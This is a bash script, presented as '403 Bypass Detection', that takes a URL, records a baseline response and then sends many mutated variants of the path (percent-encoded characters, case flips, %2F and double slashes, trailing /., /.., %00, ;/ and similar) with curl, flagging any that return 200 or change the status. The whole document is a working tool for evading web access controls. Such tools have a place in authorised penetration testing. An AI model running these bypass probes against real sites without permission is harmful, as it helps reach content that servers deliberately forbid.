#!/bin/bash
if [ "$1" != "-u" ] || [ -z "$2" ]; then
  echo "Usage: $0 -u <url>"
  exit 1
fi

url="$2"
echo "🚀 Starting 403 Bypass Detection on $url"
echo "------------------------------------------------"

base=$(echo "$url" | sed -E 's|(https?://[^/]+).*|\1|')
path=$(echo "$url" | sed -E 's|https?://[^/]+(/.*)|\1|')
[ -z "$path" ] && path="/"

baseline_file=$(mktemp)
test_file=$(mktemp)

echo "Getting baseline response..."
baseline_status=$(curl -s -o "$baseline_file" -w "%{http_code}|%{size_download}" --location --max-time 10 "$url")
baseline_code=$(echo "$baseline_status" | cut -d'|' -f1)
baseline_size=$(echo "$baseline_status" | cut -d'|' -f2)

echo "Baseline: $baseline_code ($baseline_size bytes)"
echo "Testing bypasses..."

generate_payloads() {
  local path="$1"
  local base="$2"
  
  echo "$base$(echo -n "$path" | sed 's/./\\&/g' | xxd -p | sed 's/../%&/g')"
  
  for ((i=0; i<${#path}; i++)); do
    char="${path:i:1}"
    before="${path:0:i}"
    after="${path:i+1}"
    
    printf "$base${before}%%%02X${after}\n" "'$char"
    echo "$base${before}${char}${after}"
    echo "$base${before}${char,,}${after}"
    echo "$base${before}${char^^}${after}"
    
    if [[ "$char" == "/" ]]; then
      echo "$base${before}%2F${after}"
      echo "$base${before}%2f${after}"
      echo "$base${before}//${after}"
      echo "$base${before}//${after//\/\//\/}"
    fi
  done
  
  echo "$base$path/"
  echo "$base$path/."
  echo "$base$path/.."
  echo "$base$path//"
  echo "$base$path%20"
  echo "$base$path%09"
  echo "$base$path%00"
  echo "$base$path;/"
  echo "$base$path#"
  echo "$base$path?"
}

generate_payloads "$path" "$base" | sort -u | while read test_url; do
  response=$(curl -s -o "$test_file" -w "%{http_code}|%{size_download}" --location --max-time 10 "$test_url" 2>/dev/null)
  status_code=$(echo "$response" | cut -d'|' -f1)
  response_size=$(echo "$response" | cut -d'|' -f2)
  
  if [[ -z "$status_code" ]] || [[ "$status_code" == "000" ]]; then
    echo "[-] ERR | $test_url"
    continue
  fi
  
  if [[ "$status_code" == "200" ]] && [[ "$response_size" -gt "$baseline_size" ]] && [[ "$response_size" -gt "100" ]]; then
    echo "[+] $status_code ($response_size bytes) | $test_url"
  elif [[ "$status_code" == "200" ]] && [[ "$baseline_code" != "200" ]]; then
    echo "[+] $status_code (status change) | $test_url"
  elif [[ "$status_code" -ge "300" ]] && [[ "$status_code" -lt "400" ]]; then
    echo "[?] $status_code (redirect) | $test_url"
  else
    echo "[-] $status_code | $test_url"
  fi
done

rm -f "$baseline_file" "$test_file"
